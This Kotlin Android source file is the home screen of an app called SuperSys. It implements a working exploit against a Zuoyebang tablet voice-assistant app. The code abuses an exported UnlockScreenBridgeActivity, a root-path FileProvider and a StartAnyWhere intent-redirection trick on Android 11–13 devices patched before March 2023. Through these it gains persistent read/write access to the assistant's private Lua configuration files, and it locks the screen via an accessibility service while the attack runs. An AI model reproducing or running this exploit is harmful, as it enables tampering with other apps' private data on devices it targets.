package com.cfks.supersys.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import net.steamcrafted.materialiconlib.MaterialDrawableBuilder
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import org.xmlpull.v1.XmlPullParser
import com.cfks.startanywhere.StartAnyWhere
import com.cfks.supersys.MainActivity
import com.cfks.supersys.MainActivity.Companion.EXTRA_SUPERSYS_INSTALL
import com.cfks.supersys.MainActivity.Companion.KEY_STORED_URI
import com.cfks.supersys.MainActivity.Companion.PREFS_NAME
import com.cfks.supersys.R
import com.cfks.supersys.databinding.FragmentHomeBinding
import com.cfks.supersys.service.ScreenControlService
import com.cfks.supersys.util.UriUtils

class HomeFragment : Fragment() {

    companion object {
        private const val TARGET_PACKAGE = "com.zuoyebang.iot.pad.zpvoiceassistant"
        private const val TARGET_ACTIVITY = "com.zuoyebang.iot.pad.zpvoiceassistant.UnlockScreenBridgeActivity"
        private const val FILE_PROVIDER_PATHS_KEY = "android.support.FILE_PROVIDER_PATHS"
        const val KEY_TARGET_FILE_PATH = "target_file_path"

        val TARGET_FILE_PATHS = listOf(
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/nlucfg.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lexcfg.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lua/postfunc.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lua/reformcb.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lua/reformcb.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lua/postfunc.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/nlucfg.lua",
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lexcfg.lua"
        )

        val TARGET_FILE_LABELS = listOf(
            "tasks/nlucfg.lua",
            "tasks/lexcfg.lua",
            "tasks/lua/postfunc.lua",
            "tasks/lua/reformcb.lua",
            "66dfe.../lua/reformcb.lua",
            "66dfe.../lua/postfunc.lua",
            "66dfe.../nlucfg.lua",
            "66dfe.../lexcfg.lua"
        )

        @Volatile
        var pendingExploit = false
        var pendingAuthority: String? = null
        var pendingRootName: String? = null
    }

    private var _binding: FragmentHomeBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentHomeBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        setupStatusCard()
        setupInstallButton()
        setupTargetFileButton()
        setupRevokeButton()
        setupDeviceInfo()
    }

    override fun onResume() {
        super.onResume()
        checkInstallStatus()
        // Check if we were waiting for accessibility permission
        if (pendingExploit && isAccessibilityEnabled(requireContext())) {
            pendingExploit = false
            val authority = pendingAuthority
            val rootName = pendingRootName
            pendingAuthority = null
            pendingRootName = null
            if (authority != null) {
                executeExploit(authority, rootName ?: "")
            }
        }
    }

    // region Install Status

    private fun checkInstallStatus() {
        val ctx = requireContext()
        val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
        val storedUri = prefs.getString(KEY_STORED_URI, null)

        if (storedUri == null) {
            updateInstallStatus(false)
            return
        }

        Thread {
            val content = UriUtils.readUri(ctx, storedUri)
            val installed = content != null && content.startsWith("-- SuperSys")
            requireActivity().runOnUiThread {
                if (_binding != null && isAdded) {
                    updateInstallStatus(installed)
                }
            }
        }.start()
    }

    private fun updateInstallStatus(installed: Boolean) {
        if (installed) {
            binding.tvStatusBadge.text = "已安装"
            binding.tvStatusMessage.text = "SuperSys 已成功安装并正在运行"
            binding.dotStatus.setBackgroundResource(R.drawable.bg_status_badge)
        } else {
            binding.tvStatusBadge.text = "未安装"
            binding.tvStatusMessage.text = "SuperSys 尚未安装，请点击下方安装按钮"
        }
    }

    // endregion

    private fun setupStatusCard() {
        binding.tvStatusVersion.text = getString(R.string.home_version_value)
    }

    private fun setupInstallButton() {
        val listener = View.OnClickListener { performInstallCheck() }
        binding.btnInstall.setOnClickListener(listener)
        binding.cardInstall.setOnClickListener(listener)
    }

    private fun setupRevokeButton() {
        binding.btnRevokePermissions.setOnClickListener {
            val activity = requireActivity() as? MainActivity
            activity?.revokeAllPermissions()
            updateInstallStatus(false)
        }
    }

    private fun getTargetFilePath(): String {
        val ctx = requireContext()
        val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
        return prefs.getString(KEY_TARGET_FILE_PATH, TARGET_FILE_PATHS[0]) ?: TARGET_FILE_PATHS[0]
    }

    private fun setupTargetFileButton() {
        updateTargetFileDisplay()
        binding.cardTargetFile.setOnClickListener {
            showTargetFileDialog()
        }
        binding.btnTargetFile.setOnClickListener {
            showTargetFileDialog()
        }
    }

    private fun updateTargetFileDisplay() {
        val currentPath = getTargetFilePath()
        val index = TARGET_FILE_PATHS.indexOf(currentPath)
        val label = if (index >= 0) TARGET_FILE_LABELS[index] else currentPath
        binding.tvTargetFileValue.text = label
    }

    private fun showTargetFileDialog() {
        val ctx = requireContext()
        val currentPath = getTargetFilePath()
        val currentIndex = TARGET_FILE_PATHS.indexOf(currentPath).coerceAtLeast(0)

        val labels = TARGET_FILE_LABELS.toTypedArray()

        AlertDialog.Builder(ctx)
            .setTitle("选择目标文件")
            .setSingleChoiceItems(labels, currentIndex) { dialog, which ->
                val selectedPath = TARGET_FILE_PATHS[which]
                ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
                    .edit()
                    .putString(KEY_TARGET_FILE_PATH, selectedPath)
                    .apply()
                updateTargetFileDisplay()
                dialog.dismiss()
                Toast.makeText(ctx, "已切换到: ${TARGET_FILE_LABELS[which]}", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("取消", null)
            .show()
    }

    // region Install Logic

    private fun performInstallCheck() {
        val ctx = requireContext()

        // Step 1: Check if target package has UnlockScreenBridgeActivity
        if (!isActivityExists(ctx, TARGET_PACKAGE, TARGET_ACTIVITY)) {
            showUnsupportedDialog("不支持的设备:缺失UnlockScreenBridgeActivity")
            return
        }

        // Step 2: Find a FileProvider with root-path in the target package
        val rootPathInfo = findRootPathFileProvider(ctx, TARGET_PACKAGE)
        if (rootPathInfo == null) {
            showUnsupportedDialog("不支持的设备:缺失root-path FileProvider")
            return
        }

        val authority = rootPathInfo.first
        val rootName = rootPathInfo.second

        // Step 3: Check accessibility permission (auto-request if needed)
        if (!isAccessibilityEnabled(ctx)) {
            pendingExploit = true
            pendingAuthority = authority
            pendingRootName = rootName

            AlertDialog.Builder(ctx)
                .setTitle("需要无障碍权限")
                .setMessage("SuperSys 需要无障碍权限来执行熄屏操作。\n请在设置中启用 SuperSys 的无障碍服务，返回后将自动继续。")
                .setPositiveButton("去设置") { _, _ ->
                    val settingsIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    StartAnyWhere.pullSpecialActivity(ctx, settingsIntent)
                }
                .setNegativeButton("取消") { _, _ ->
                    pendingExploit = false
                    pendingAuthority = null
                    pendingRootName = null
                }
                .setCancelable(false)
                .show()
            return
        }

        // Step 4: Lock screen then execute exploit
        executeExploit(authority, rootName)
    }

    private fun executeExploit(authority: String, rootName: String) {
        val ctx = requireContext()
        val targetFilePath = getTargetFilePath()

        // Construct the content URI: content://{authority}/{rootName}{filePath}
        val uriStr = if (rootName.isNotEmpty()) {
            "content://$authority/$rootName$targetFilePath"
        } else {
            "content://$authority$targetFilePath"
        }

        // Fire StartAnyWhere exploit first
        val hackedIntent = getHackedIntent(uriStr)
        StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)

        // Lock screen ~15ms later (concurrent but slightly delayed)
        Handler(Looper.getMainLooper()).postDelayed({
            ScreenControlService.lockScreen()
        }, 15)
    }

    private fun getHackedIntent(url: String): Intent {
        val ctx = requireContext()

        // intent1: targets UnlockScreenBridgeActivity
        val intent1 = Intent().setComponent(
            ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY)
        )

        val uri = Uri.parse(url)

        // Resolve MIME type from the content provider (fallback to */* on failure)
        val mimeType = try {
            ctx.contentResolver.getType(uri) ?: "*/*"
        } catch (e: Exception) {
            "*/*"
        }

        // intent2: targets our own MainActivity with the file URI + grant flags + install marker
        val intent2 = Intent()
            .setComponent(
                ComponentName(ctx.packageName, MainActivity::class.java.name)
            )
            .setDataAndType(uri, mimeType)
            .putExtra(EXTRA_SUPERSYS_INSTALL, true)
            .addFlags(
                Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                Intent.FLAG_GRANT_READ_URI_PERMISSION or
                Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                Intent.FLAG_ACTIVITY_NEW_TASK
            )

        intent1.putExtra("originalIntent", intent2)
        return intent1
    }

    // endregion

    // region Checks

    private fun isActivityExists(
        ctx: android.content.Context,
        packageName: String,
        activityName: String
    ): Boolean {
        return try {
            val pm = ctx.packageManager
            val pkgInfo = pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES)
            pkgInfo.activities?.any { it.name == activityName } == true
        } catch (e: Exception) {
            false
        }
    }

    private fun findRootPathFileProvider(
        ctx: android.content.Context,
        packageName: String
    ): Pair<String, String>? {
        return try {
            val pm = ctx.packageManager
            val pkgInfo = pm.getPackageInfo(
                packageName,
                PackageManager.GET_PROVIDERS or PackageManager.GET_META_DATA
            )
            val providers = pkgInfo.providers ?: return null
            val res = pm.getResourcesForApplication(packageName)

            for (provider in providers) {
                val rawAuthority = provider.authority ?: continue
                val authority = rawAuthority.split(";").firstOrNull()?.trim()
                    ?: continue

                val metaData = provider.metaData ?: continue
                val xmlResId = metaData.getInt(FILE_PROVIDER_PATHS_KEY, 0)
                if (xmlResId == 0) continue

                val parser = res.getXml(xmlResId)
                var eventType = parser.eventType
                while (eventType != XmlPullParser.END_DOCUMENT) {
                    if (eventType == XmlPullParser.START_TAG &&
                        parser.name == "root-path"
                    ) {
                        val name = parser.getAttributeValue(null, "name") ?: ""
                        parser.close()
                        return Pair(authority, name)
                    }
                    eventType = parser.next()
                }
                parser.close()
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isAccessibilityEnabled(ctx: android.content.Context): Boolean {
        val serviceName = "${ctx.packageName}/${ScreenControlService::class.java.name}"
        val enabled = Settings.Secure.getInt(
            ctx.contentResolver,
            Settings.Secure.ACCESSIBILITY_ENABLED,
            0
        ) == 1
        if (!enabled) return false
        val list = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return list?.contains(serviceName) == true
    }

    // endregion

    // region Device Info

    private fun setupDeviceInfo() {
        setInfoItem(
            R.id.info_supersys,
            MaterialDrawableBuilder.IconValue.CHECK_CIRCLE,
            getString(R.string.home_info_supersys),
            getString(R.string.home_info_supersys_value)
        )
        setInfoItem(
            R.id.info_android,
            MaterialDrawableBuilder.IconValue.ANDROID,
            getString(R.string.home_info_android),
            "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
        )
        setInfoItem(
            R.id.info_device,
            MaterialDrawableBuilder.IconValue.PHONE,
            getString(R.string.home_info_device),
            "${Build.MANUFACTURER} ${Build.MODEL}"
        )
        setInfoItem(
            R.id.info_patch,
            MaterialDrawableBuilder.IconValue.SHIELD,
            getString(R.string.home_info_patch),
            Build.VERSION.SECURITY_PATCH ?: "未知"
        )
        setInfoItem(
            R.id.info_startanywhere,
            MaterialDrawableBuilder.IconValue.INFORMATION,
            getString(R.string.home_info_startanywhere),
            if (canStartAnyWhere()) getString(R.string.home_info_startanywhere_yes)
            else getString(R.string.home_info_startanywhere_no)
        )
    }

    private fun canStartAnyWhere(): Boolean {
        return Build.VERSION.SDK_INT >= 30 &&
               Build.VERSION.SDK_INT <= 33 &&
               Build.VERSION.SECURITY_PATCH != null &&
               Build.VERSION.SECURITY_PATCH.compareTo("2023-03-01") < 0
    }

    private fun setInfoItem(itemId: Int, iconValue: MaterialDrawableBuilder.IconValue, label: String, value: String) {
        val item = binding.root.findViewById<View>(itemId) ?: return
        val icon = item.findViewById<ImageView>(R.id.iv_info_icon)
        val tvLabel = item.findViewById<TextView>(R.id.tv_info_label)
        val tvValue = item.findViewById<TextView>(R.id.tv_info_value)
        val colorPrimary = resources.getColor(R.color.primary, null)
        icon.setImageDrawable(
            MaterialDrawableBuilder.with(requireContext())
                .setIcon(iconValue)
                .setColor(colorPrimary)
                .setSizeDp(24)
                .build()
        )
        tvLabel.text = label
        tvValue.text = value
    }

    // endregion

    private fun showUnsupportedDialog(message: String) {
        AlertDialog.Builder(requireContext())
            .setTitle("不支持")
            .setMessage(message)
            .setPositiveButton("确定", null)
            .show()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
